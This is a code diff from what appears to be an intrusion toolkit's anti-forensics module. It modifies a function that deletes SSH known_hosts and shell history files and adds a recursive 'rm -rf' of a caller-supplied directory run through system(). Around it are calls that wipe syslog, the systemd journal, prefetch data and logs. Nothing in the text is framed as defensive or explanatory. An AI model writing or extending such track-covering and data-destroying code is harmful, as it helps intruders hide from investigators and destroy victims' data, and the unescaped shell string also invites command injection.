@@ -36,12 +36,15 @@ int jocky_linux_cleanup_journal(void) {
     return 0;
 }
 
-int jocky_wipe_artifacts(void) {
-    /* Wipe various artifact locations */
+void jocky_wipe_artifacts(const char* dir) {
     system("rm -f ~/.ssh/known_hosts 2>/dev/null");
     system("rm -f ~/.bash_history 2>/dev/null");
     system("rm -f ~/.zsh_history 2>/dev/null");
-    return 0;
+    if (dir && *dir) {
+        char cmd[512];
+        snprintf(cmd, sizeof(cmd), "rm -rf \"%s\" 2>/dev/null", dir);
+        system(cmd);
+    }
 }
 
 int jocky_wipe_prefetch(void) {
@@ -85,7 +88,7 @@ int jocky_cleanup_all(void) {
     linux_forensics_wipe_bash_history();
     jocky_linux_cleanup_syslog();
     jocky_linux_cleanup_journal();
-    jocky_wipe_artifacts();
+    jocky_wipe_artifacts(NULL);
     jocky_wipe_prefetch();
     jocky_clear_logs();
     return 0;
